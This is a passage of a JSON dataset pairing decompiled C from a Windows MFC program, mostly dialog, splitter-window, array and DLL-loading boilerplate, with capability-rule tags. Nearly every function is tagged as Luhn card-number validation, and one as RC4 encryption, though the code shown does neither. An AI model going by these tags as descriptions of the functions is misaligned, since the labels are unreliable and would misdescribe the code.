        "decompiled_code": "\nvoid __thiscall fcn.0041b25b(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if ((-1 < param_2) && (-1 < param_3)) {\n        if (param_2 + param_3 <= *(param_1 + 8)) {\n            iVar2 = (*(param_1 + 8) - param_2) - param_3;\n            if (iVar2 != 0) {\n                fcn.0040a2e0(*(param_1 + 4) + param_2 * 4, *(param_1 + 4) + (param_2 + param_3) * 4, iVar2 * 4);\n            }\n            *(param_1 + 8) = *(param_1 + 8) - param_3;\n            return;\n        }\n    }\n    fcn.004198e6();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 236
    },
    "0041b2e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b2e9(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    \n    iVar1 = arg_8h;\n    iVar5 = 0;\n    if (arg_8h < 0) {\ncode_r0x0041b3a3:\n        fcn.004198e6();\n    }\n    else {\n        if (-1 < arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (arg_8h == 0) {\n            fcn.0041bae1(*(in_ECX + 4));\n            *(in_ECX + 0xc) = 0;\n            *(in_ECX + 8) = 0;\n            goto code_r0x0041b3e4;\n        }\n        if (*(in_ECX + 4) == 0) {\n            uVar3 = fcn.0041bab6(arg_8h);\n            *(in_ECX + 4) = uVar3;\n            fcn.0040bbe0(uVar3, 0, arg_8h);\n            *(in_ECX + 0xc) = arg_8h;\ncode_r0x0041b33e:\n            *(in_ECX + 8) = arg_8h;\n            return;\n        }\n        iVar5 = *(in_ECX + 0xc);\n        if (arg_8h <= iVar5) {\n            iVar1 = *(in_ECX + 8);\n            if (iVar1 < arg_8h) {\n                fcn.0040bbe0(iVar1 + *(in_ECX + 4), 0, arg_8h - iVar1);\n            }\n            goto code_r0x0041b33e;\n        }\n        iVar4 = *(in_ECX + 0x10);\n        if (iVar4 == 0) {\n            iVar4 = *(in_ECX + 8) / 8;\n            if (iVar4 < 4) {\ncode_r0x0041b38f:\n                iVar4 = 4;\n            }\n            else if (iVar4 < 0x401) {\n                if (iVar4 < 4) goto code_r0x0041b38f;\n            }\n            else {\n                iVar4 = 0x400;\n            }\n        }\n        iVar2 = iVar4 + iVar5;\n        if (iVar4 + iVar5 <= arg_8h) {\n            iVar2 = arg_8h;\n        }\n        arg_8h = iVar2;\n        if (arg_8h < iVar5) goto code_r0x0041b3a3;\n    }\n    iVar5 = fcn.0041bab6(arg_8h);\n    fcn.0040b7b0(iVar5, *(in_ECX + 4), *(in_ECX + 8));\n    fcn.0040bbe0(*(in_ECX + 8) + iVar5, 0, iVar1 - *(in_ECX + 8));\n    fcn.0041bae1(*(in_ECX + 4));\n    *(in_ECX + 8) = iVar1;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x0041b3e4:\n    *(in_ECX + 4) = iVar5;\n    return;\n}\n",
        "token_count": 773
    },
    "0041b715": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041b715(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = arg_8h;\n    puVar2 = fcn.0041b53e(arg_8h, &arg_8h, &var_4h);\n    if (puVar2 == NULL) {\n        if (*(in_ECX + 4) == 0) {\n            fcn.0041b4ae(*(in_ECX + 8), 1);\n        }\n        puVar2 = fcn.0041b6ca();\n        puVar2[1] = iVar1;\n        *puVar2 = *(arg_8h * 4 + *(in_ECX + 4));\n        *(arg_8h * 4 + *(in_ECX + 4)) = puVar2;\n    }\n    return puVar2 + 2;\n}\n",
        "token_count": 220
    },
    "0041bbb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041bbb0(uint param_1, uchar *param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    ushort *puVar2;\n    \n    if (param_2 != NULL) {\n        iVar1 = fcn.00434fe8();\n        puVar2 = fcn.00401140(*(iVar1 + 0xc), param_1);\n        if (puVar2 != NULL) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, puVar2 + 1, *puVar2, param_2, param_3 + -1, 0, 0)\n            ;\n            param_2[iVar1] = 0;\n            return iVar1;\n        }\n        *param_2 = 0;\n    }\n    return 0;\n}\n",
        "token_count": 190
    },
    "0041bd60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041bd60(int32_t param_1)\n\n{\n    if (*(param_1 + 0x10) != 0) {\n    // WARNING: Could not recover jumptable at 0x0041bd69. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*(param_1 + 0x10) + 0x1c))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "0041bd6d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.0041bd6d(uint arg_8h, uint *arg_ch, uint noname_2, code *arg_14h, uint *arg_18h, int32_t arg_1ch, uint *arg_20h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 1;\n    if (arg_20h != NULL) {\n        *arg_20h = arg_8h;\n        arg_20h[1] = arg_14h;\n        return 1;\n    }\n    if (0xb < arg_1ch - 0x35U) {\n        return 0;\n    }\n    // switch table (12 cases) at 0x41be53\n    switch(*((arg_1ch - 0x35U) * 4 + 0x41be53)) {\n    case 0x41bda4:\n        (*arg_14h)();\n        break;\n    case 0x41bdaf:\n        uVar1 = (*arg_14h)();\n        break;\n    case 0x41bdba:\n        arg_18h = arg_ch;\n        goto code_r0x0041be34;\n    case 0x41bdbf:\n        arg_18h = arg_ch;\n        goto code_r0x0041be3f;\n    case 0x41bdc4:\n        (*arg_14h)(arg_18h[1], *arg_18h);\n        break;\n    case 0x41bdd4:\n        uVar1 = (*arg_14h)(arg_18h[1], *arg_18h);\n        break;\n    case 0x41bde4:\n        (*arg_14h)(arg_ch, arg_18h[1], *arg_18h);\n        break;\n    case 0x41bdf7:\n        uVar1 = (*arg_14h)(arg_ch, arg_18h[1], *arg_18h);\n        break;\n    case 0x41be0a:\n        (*arg_14h)(arg_18h);\n        goto code_r0x0041be23;\n    case 0x41be16:\n        (*arg_14h)(arg_18h, arg_ch);\ncode_r0x0041be23:\n        uVar1 = arg_18h[7] == 0;\n        arg_18h[7] = 0;\n        break;\n    case 0x41be31:\ncode_r0x0041be34:\n        (*arg_14h)(arg_18h);\n        break;\n    case 0x41be3c:\ncode_r0x0041be3f:\n        uVar1 = (*arg_14h)(arg_18h);\n    }\n    return uVar1;\n}\n",
        "token_count": 612
    },
    "0041c27a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.0041c27a(code **param_1)\n\n{\n    fcn.0041e3dc();\n    *param_1 = vtable.CDialog.0;\n    fcn.0040bbe0(param_1 + 0x14, 0, 0x20);\n    return param_1;\n}\n",
        "token_count": 75
    },
    "0041c343": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.0041c343(code **param_1, code *param_2, code *param_3)\n\n{\n    fcn.0041e3dc();\n    *param_1 = vtable.CDialog.0;\n    fcn.0040bbe0(param_1 + 0x14, 0, 0x20);\n    param_1[0x19] = param_3;\n    param_1[0x14] = param_2;\n    param_1[0x15] = param_2 & 0xffff;\n    return param_1;\n}\n",
        "token_count": 133
    },
    "0041d2c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0041d2c2(int32_t *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_14h;\n    \n    puVar1 = (**(*param_1 + 0x28))();\n    do {\n        if (puVar1 == NULL) {\n            return 0;\n        }\n        arg_14h = 0;\n        if (*(param_2 + 4) < 0xc000) {\n            iVar2 = fcn.0041da9d(puVar1[1], *(param_2 + 4), 0, 0);\n            if (iVar2 != 0) {\ncode_r0x0041d2f7:\n                (**(iVar2 + 0x14))(*(param_2 + 8), *(param_2 + 0xc));\n                return 1;\n            }\n        }\n        else {\n            iVar2 = puVar1[1];\n            while (iVar2 = fcn.0041da9d(iVar2, 0xc000, 0, arg_14h),  iVar2 != 0) {\n                if (**(iVar2 + 0x10) == *(param_2 + 4)) goto code_r0x0041d2f7;\n                iVar2 = iVar2 + 0x18;\n            }\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 324
    },
    "0041d6a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __thiscall fcn.0041d6a0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBX;\n    int32_t arg_8h;\n    \n    if (param_2 < 1) {\n        iVar3 = *(param_1 + 0x1c);\n        if (((iVar3 != 0) && (*(iVar3 + 0x1c) != 0)) &&\n           (iVar1 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar3 + 0x1c)),  iVar1 != 0)) {\n            fcn.0041f5e1(iVar3, *(iVar3 + 0x1c), 0x363, 1, 0);\n            fcn.0041f8b8(*(iVar3 + 0x1c), 0x363, 1, 0, 1, 1);\n        }\n        fcn.00434fe8();\n        arg_8h = 0x434fa8;\n        iVar1 = fcn.00437973(0x434fa8);\n        for (iVar1 = *(iVar1 + 8); iVar1 != 0; iVar1 = *(iVar1 + 0x68)) {\n            if ((*(iVar1 + 0x1c) != 0) && (iVar1 != iVar3)) {\n                if (*(iVar1 + 0x9c) == 0) {\n                    fcn.0041cdb9(0, arg_8h);\n                }\n                iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar1 + 0x1c));\n                if ((iVar2 != 0) || (-1 < *(iVar1 + 0x9c))) {\n                    fcn.0041f5e1(iVar1, *(iVar1 + 0x1c), 0x363, 1, 0);\n                    arg_8h = *(iVar1 + 0x1c);\n                    fcn.0041f8b8(arg_8h, 0x363, 1, 0, 1, 1);\n                }\n                iVar2 = *(iVar1 + 0x9c);\n                if (0 < iVar2) {\n                    fcn.0041cdb9();\n                    arg_8h = iVar2;\n                }\n                *(iVar1 + 0x9c) = 0xffffffff;\n            }\n        }\n    }\n    else {\n        fcn.00434fe8();\n        iVar3 = fcn.00437973(0x434fa8);\n        if (*(iVar3 + 0x10) == 0) {\n            fcn.0042328d();\n            fcn.0042343f(1);\n        }\n    }\n    return unaff_EBX < 0;\n}\n",
        "token_count": 639
    },
    "0041e5d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpWndClass\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0041e5d9(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint noname_1;\n    uint *noname_3;\n    uint lpWndClass;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00434fd8();\n    iVar1 = iVar1 + 0x7c;\n    iVar2 = fcn.00434fe8();\n    var_18h = *(iVar2 + 8);\n    if (((arg_ch == 0) && (arg_10h == 0)) && (arg_14h == 0)) {\n        fcn.0040c999(iVar1, \"Afx:%p:%x\", var_18h);\n    }\n    else {\n        fcn.0040c999(iVar1, \"Afx:%p:%x:%p:%p:%p\", var_18h);\n    }\n    noname_3 = &lpWndClass;\n    noname_1 = var_18h;\n    iVar2 = iVar1;\n    iVar3 = (*_sym.imp.USER32.dll_GetClassInfoA)();\n    if (iVar3 == 0) {\n        lpWndClass = arg_8h;\n        var_24h = _sym.imp.USER32.dll_DefWindowProcA;\n        var_1ch = 0;\n        var_20h = 0;\n        var_8h = 0;\n        var_14h = arg_14h;\n        var_10h = arg_ch;\n        var_ch = arg_10h;\n        var_4h = iVar1;\n        iVar2 = fcn.0041d965(&lpWndClass, noname_1, iVar2, noname_3, unaff_EDI, unaff_ESI, unaff_EBX, arg_8h, \n                             _sym.imp.USER32.dll_DefWindowProcA, 0, 0, var_18h, arg_14h, arg_ch, arg_10h, 0, iVar1, \n                             unaff_EBP);\n        if (iVar2 == 0) {\n            fcn.00425f1e();\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 760
    },
    "0041eede": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0041eede(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t unaff_retaddr;\n    \n    iVar1 = fcn.0041ee3b(0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (*(iVar1 + 0x20) != 0) {\n        for (puVar2 = *(*(iVar1 + 0x20) + ((unaff_retaddr >> 4) % *(iVar1 + 0x24)) * 4); puVar2 != NULL;\n            puVar2 = *puVar2) {\n            if (puVar2[1] == unaff_retaddr) {\n                return puVar2[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 178
    },
    "0042172d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042172d(void)\n\n{\n    uint uVar1;\n    uint unaff_retaddr;\n    \n    uVar1 = fcn.004026d0(0x104);\n    fcn.0040bbe0(uVar1, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_lstrcpynA)(uVar1, unaff_retaddr, 0x104);\n    (*_sym.imp.SHLWAPI.dll_PathStripToRootA)(uVar1);\n    fcn.00407fe0(0xffffffff);\n    return;\n}\n",
        "token_count": 128
    },
    "00421aad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_108h\n\nvoid __cdecl fcn.00421aad(uint arg_8h, uint *arg_ch)\n\n{\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    (*_sym.imp.USER32.dll_wsprintfA)\n              (&var_104h, \"{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\", *arg_ch, *(arg_ch + 1), *(arg_ch + 6), \n               *(arg_ch + 2), *(arg_ch + 9), *(arg_ch + 10), *(arg_ch + 0xb), *(arg_ch + 3), *(arg_ch + 0xd), \n               *(arg_ch + 0xe), *(arg_ch + 0xf), 0);\n    fcn.00406c60(&var_104h);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 242
    },
    "00421b2f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00421b2f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    puVar1 = *(unaff_EBP + 0x10);\n    *puVar1 = 0;\n    fcn.00421aad(unaff_EBP + -0x10, *(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    piVar2 = fcn.0041bc88();\n    iVar3 = (**(*piVar2 + 0xc))();\n    *(unaff_EBP + 0x10) = iVar3 + 0x10;\n    *(unaff_EBP + -4) = 1;\n    iVar3 = fcn.0042167d(*(unaff_EBP + -0x10), unaff_EBP + 0x10);\n    if (iVar3 != 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(*(unaff_EBP + 0x10));\n        if (iVar3 != 0) {\n            pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"DllGetClassObject\");\n            if (pcVar4 == NULL) {\n                uVar5 = 0x800401f9;\n            }\n            else {\n                uVar5 = (*pcVar4)(*(unaff_EBP + 8), *(unaff_EBP + 0xc), puVar1);\n            }\n            goto code_r0x00421baf;\n        }\n    }\n    uVar5 = 0x80040154;\ncode_r0x00421baf:\n    fcn.00401180();\n    fcn.00401180();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar5;\n}\n",
        "token_count": 527
    },
    "0042226d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0042226d(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (0x10b < param_1) {\n        if (param_1 == 0x3e3) {\n            return 10;\n        }\n        if (param_1 == 0x3e4) {\n            return 10;\n        }\n        if (param_1 == 0x3e5) {\n            return 10;\n        }\n        if (param_1 == 999) {\n            return 5;\n        }\n        return 1;\n    }\n    if (param_1 == 0x10b) {\n        return 3;\n    }\n    if (param_1 < 0x3f) {\n        if (param_1 == 0x3e) {\n            return 8;\n        }\n        if (param_1 < 0x1a) {\n    // switch table (25 cases) at 0x42244b\n            switch(param_1) {\n            case 0:\n                return 0;\n            case 1:\n            case 7:\n            case 8:\n            case 9:\n            case 10:\n            case 0xd:\n            case 0xe:\n                goto code_r0x00422368;\n            case 2:\n            case 6:\n            case 0x12:\n                goto code_r0x00422368;\n            case 3:\n            case 0xf:\n            case 0x11:\n                goto code_r0x00422368;\n            case 4:\n                return 4;\n            case 5:\n            case 0xc:\n            case 0x13:\ncode_r0x00422368:\n                return 5;\n            case 0xb:\ncode_r0x00422368:\n                return 6;\n            case 0x10:\n                return 7;\n            case 0x14:\n            case 0x15:\n            case 0x16:\n            case 0x17:\ncode_r0x00422368:\n                return 10;\n            default:\n                goto code_r0x00422368;\n            }\n        }\n        if (0x27 < param_1) {\n    // switch table (9 cases) at 0x4224af\n            switch(param_1) {\n            case 0x34:\n            case 0x35:\n            case 0x37:\n                goto code_r0x00422368;\n            case 0x36:\n            case 0x3a:\n                goto code_r0x00422368;\n            default:\n                return 1;\n            case 0x39:\n            case 0x3b:\n                goto code_r0x00422368;\n            case 0x3c:\n                goto code_r0x00422368;\n            }\n        }\n        if (param_1 == 0x27) {\n            return 0xd;\n        }\n        if (0x20 < param_1) {\n            if (param_1 == 0x21) {\n                return 0xc;\n            }\n            if (param_1 == 0x22) {\n                return 3;\n            }\n            if (param_1 == 0x24) {\n                return 4;\n            }\n            if (param_1 == 0x26) {\n                return 0xe;\n            }\n            return 1;\n        }\n        if (param_1 == 0x20) {\n            return 0xb;\n        }\n        if (param_1 == 0x1a) {\n            return 6;\n        }\n        if (param_1 == 0x1b) {\n            return 9;\n        }\n        iVar1 = param_1 - 0x1d;\n        if (iVar1 == 0) {\n            return 5;\n        }\ncode_r0x004223b4:\n        if (iVar1 == 1) {\ncode_r0x00422368:\n            return 9;\n        }\n    }\n    else {\n        if (param_1 < 0x6c) {\n            if (param_1 == 0x6b) {\ncode_r0x00422368:\n                return 2;\n            }\n            if (0x47 < param_1) {\n                if (param_1 == 0x50) {\n                    return 5;\n                }\n                if (param_1 == 0x52) {\n                    return 5;\n                }\n                if (param_1 == 0x55) {\n                    return 3;\n                }\n                if (param_1 != 0x56) {\n                    if (param_1 == 0x58) {\n                        return 10;\n                    }\n                    return 1;\n                }\n                return 5;\n            }\n            if (param_1 == 0x47) {\n                return 5;\n            }\n            if (param_1 == 0x40) {\n                return 5;\n            }\n            if (param_1 == 0x41) {\n                return 5;\n            }\n            if (param_1 == 0x42) {\n                return 6;\n            }\n            if (param_1 == 0x43) {\n                return 3;\n            }\n            iVar1 = param_1 - 0x44;\n            if (iVar1 == 0) {\n                return 4;\n            }\n        }\n        else {\n            if (param_1 < 0x91) {\n                if (param_1 == 0x90) {\n                    return 3;\n                }\n                if (param_1 < 0x76) {\n                    if (param_1 == 0x75) {\n                        return 10;\n                    }\n                    if (param_1 == 0x6c) {\n                        return 0xc;\n                    }\n                    if (param_1 == 0x6f) {\n                        return 3;\n                    }\n                    if (param_1 == 0x70) {\n                        return 0xd;\n                    }\n                    if (param_1 == 0x71) {\n                        return 4;\n                    }\n                    if (param_1 != 0x72) {\n                        return 1;\n                    }\n                    return 6;\n                }\n                if (param_1 == 0x7b) {\n                    return 3;\n                }\n                if (param_1 == 0x7c) {\n                    return 3;\n                }\n                if (param_1 == 0x7d) {\n                    return 3;\n                }\n                iVar1 = param_1 - 0x83;\n                if (iVar1 == 0) {\n                    return 9;\n                }\n                goto code_r0x004223b4;\n            }\n            if (param_1 < 0xb7) {\n                if (param_1 == 0xb6) {\n                    return 6;\n                }\n                if (param_1 == 0x91) {\n                    return 7;\n                }\n                if (param_1 == 0x9a) {\n                    return 3;\n                }\n                if (param_1 != 0xa1) {\n                    if (param_1 == 0xa7) {\n                        return 0xc;\n                    }\n                    if (param_1 == 0xaa) {\n                        return 5;\n                    }\n                    return 1;\n                }\n                return 3;\n            }\n            if (param_1 == 0xb7) {\n                return 5;\n            }\n            if (param_1 == 0xbf) {\n                return 6;\n            }\n            if (param_1 == 0xc1) {\n                return 6;\n            }\n            iVar1 = param_1 - 0xce;\n            if (iVar1 == 0) {\n                return 3;\n            }\n        }\n        if (iVar1 == 2) {\ncode_r0x00422368:\n            return 3;\n        }\n    }\ncode_r0x00422368:\n    return 1;\n}\n",
        "token_count": 1717
    },
    "004226ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004226ae(int32_t *param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    \n    param_1[1] = param_3;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40);\n    *param_1 = iVar1;\n    if (iVar1 != 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1);\n        fcn.0040b7b0(arg_8h, param_3 + 0x40, param_1[1]);\n        iVar1 = fcn.00422697(arg_8h);\n        param_1[2] = iVar1 == 0;\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*param_1);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 209
    },
    "00422716": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00422716(int32_t param_1)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    if (*(param_1 + 2) == -1) {\n        piVar2 = param_1 + 0x1a;\n    }\n    else {\n        piVar2 = param_1 + 0x12;\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 250
    },
    "00422e8b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\ncode ** __cdecl fcn.00422e8b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *arg_10h_00;\n    uint uVar1;\n    code **ppcVar2;\n    code *pcVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CRecentFileList.0;\n    fcn.00402330();\n    *(unaff_EBP + -4) = 0;\n    fcn.00402330();\n    fcn.00402330();\n    arg_10h_00 = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -4) = 2;\n    ppcVar2 = fcn.0041bab6(arg_10h_00 * 4 + 4);\n    if (ppcVar2 == NULL) {\n        pcVar3 = NULL;\n    }\n    else {\n        *ppcVar2 = arg_10h_00;\n        *(unaff_EBP + 0x14) = ppcVar2 + 1;\n        fcn.0040d1ea(ppcVar2 + 1, 4, arg_10h_00, fcn.00402330);\n        pcVar3 = *(unaff_EBP + 0x14);\n    }\n    uVar1 = *(unaff_EBP + 0xc);\n    extraout_ECX[2] = pcVar3;\n    pcVar3 = *(unaff_EBP + 8);\n    extraout_ECX[1] = arg_10h_00;\n    extraout_ECX[5] = pcVar3;\n    fcn.00403860(uVar1);\n    fcn.00403860(*(unaff_EBP + 0x10));\n    uVar1 = *(unaff_EBP + -0xc);\n    extraout_ECX[6] = *(unaff_EBP + 0x18);\n    *in_FS_OFFSET = uVar1;\n    return extraout_ECX;\n}\n",
        "token_count": 567
    },
    "004235c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004235c2(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t unaff_retaddr;\n    \n    iVar1 = fcn.00423538(0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (*(iVar1 + 0x20) != 0) {\n        for (puVar2 = *(*(iVar1 + 0x20) + ((unaff_retaddr >> 4) % *(iVar1 + 0x24)) * 4); puVar2 != NULL;\n            puVar2 = *puVar2) {\n            if (puVar2[1] == unaff_retaddr) {\n                return puVar2[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 176
    },
    "00427eb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00427eb0(uint param_1, uint param_2, int32_t param_3, code *param_4)\n\n{\n    if (-1 < param_3 + -1) {\n        do {\n            (*param_4)();\n            param_3 = param_3 + -1;\n        } while (param_3 != 0);\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00428de6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428de6(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_SetRectEmpty)(&var_10h);\n    fcn.0042bcce(&var_10h, 1);\n    *arg_ch = *arg_ch + var_10h;\n    arg_ch[1] = arg_ch[1] + var_ch + -2;\n    arg_ch[2] = arg_ch[2] + var_8h;\n    arg_ch[3] = arg_ch[3] + var_4h;\n    return;\n}\n",
        "token_count": 168
    },
    "00429140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00429140(int32_t param_1, int32_t param_2)\n\n{\n    fcn.0041cc4d((param_1 + 0xe90) * 0x10 + param_2);\n    return;\n}\n",
        "token_count": 56
    },
    "0042973c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.0042973c(code **param_1)\n\n{\n    fcn.0041e3dc();\n    *param_1 = vtable.CSplitterWnd.0;\n    fcn.0040bbe0(param_1 + 0x14, 0, 0x88);\n    param_1[0x1a] = NULL;\n    param_1[0x19] = NULL;\n    param_1[0x18] = 0x7;\n    param_1[0x17] = 0x7;\n    param_1[0x1c] = 0x7;\n    param_1[0x1b] = 0x7;\n    param_1[0x1e] = 0x2;\n    param_1[0x1d] = 0x2;\n    return param_1;\n}\n",
        "token_count": 195
    },
